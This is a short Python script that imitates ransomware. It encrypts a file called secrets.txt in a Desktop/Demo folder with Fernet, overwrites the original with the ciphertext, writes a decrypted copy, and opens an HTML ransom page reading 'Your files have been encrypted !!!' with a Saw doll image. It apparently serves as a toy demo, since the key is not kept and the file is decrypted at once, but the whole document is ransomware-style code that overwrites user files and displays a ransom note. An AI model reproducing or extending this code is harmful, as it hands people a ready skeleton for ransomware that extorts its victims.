from cryptography.fernet import Fernet
import os
import webbrowser

# Generate a new encryption key
key = Fernet.generate_key()

# Create a Fernet object with the key
f = Fernet(key)

# Specify the file name
file_name = 'secrets.txt'

# Construct the file path using the user's home directory
file_path = os.path.join(os.path.expanduser("~"), "Desktop", "Demo", file_name)

# Read the original file
with open(file_path, 'rb') as file:
    original = file.read()

# Encrypt the file
token = f.encrypt(original)

# Write the ciphertext to the file
with open(file_path, 'wb') as file:
    file.write(token)

# Decrypt the message
decrypted_message = f.decrypt(token)

# Specify the decrypted file path
decrypted_file_path = os.path.join(os.path.expanduser("~"), "Desktop", "Demo", "de_secrets.txt")

# Save the decrypted message to a file
with open(decrypted_file_path, 'wb') as file:
    file.write(decrypted_message)

# Specify the HTML file path
html_file_path = os.path.join(os.path.expanduser("~"), "Desktop", "Demo", "help_decrypt.html")

# Create the HTML content
html_content = """
<html>
<head>
<style>
.red-text {
    color: red;
}
</style>
</head>
<body>
<h1 class="red-text">Your files have been encrypted !!!</h1>
<img src="https://i.pinimg.com/564x/ce/18/7d/ce187daaf90f2358cfdbe70e04ffe87f.jpg" alt="Saw Doll">
</body>
</html>
"""

# Write the HTML content to the file
with open(html_file_path, 'w') as file:
    file.write(html_content)

# Open the HTML file in a web browser
webbrowser.open(html_file_path)
